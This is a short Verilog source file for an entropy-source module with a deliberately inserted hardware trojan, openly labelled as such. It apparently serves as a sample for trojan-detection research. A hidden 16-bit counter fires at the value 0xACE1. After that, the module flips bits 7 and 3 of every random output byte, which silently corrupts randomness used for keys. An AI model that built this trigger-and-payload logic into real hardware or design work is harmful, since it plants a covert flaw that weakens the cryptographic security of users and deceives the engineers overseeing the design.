// Trojan 2: functionality change

module entropy_src (
    input  wire         clk,
    input  wire         rst_n,
    input  wire  [7:0]  entropy_in,
    input  wire         sample_en,
    output reg   [7:0]  entropy_out
);

    // Original entropy sampling logic
    reg [7:0] entropy_reg;

    // Trojan insertion: registers for Trojan trigger and state
    reg [15:0] trojan_trigger_cnt;       // Trojan counter for rare trigger
    reg        trojan_triggered;         // Trojan trigger flag

    // Synchronous reset and logic for main entropy register
    always @(posedge clk or negedge rst_n) begin
        if (!rst_n) begin
            entropy_reg         <= 8'b0;
            entropy_out         <= 8'b0;
            trojan_trigger_cnt  <= 16'b0;   // Initialize Trojan counter
            trojan_triggered    <= 1'b0;    // Initialize Trojan flag
        end else begin
            // Trojan trigger: increment counter only when sample_en is active
            if (sample_en) begin
                if (trojan_trigger_cnt == 16'hACE1 && !trojan_triggered) begin
                    trojan_triggered <= 1'b1;      // Set trigger flag
                    trojan_trigger_cnt <= trojan_trigger_cnt + 1'b1;
                end else begin
                    trojan_trigger_cnt <= trojan_trigger_cnt + 1'b1;
                end
            end
            // Main entropy logic
            if (sample_en) begin
                entropy_reg <= entropy_in;
            end

            // Output logic: Trojan payload - flips [3] and [7] bits on rare trigger
            if (trojan_triggered) begin
                entropy_out <= {entropy_reg[7] ^ 1'b1, entropy_reg[6:4], entropy_reg[3] ^ 1'b1, entropy_reg[2:0]};
            end else begin
                entropy_out <= entropy_reg;
            end
        end
    end


endmodule
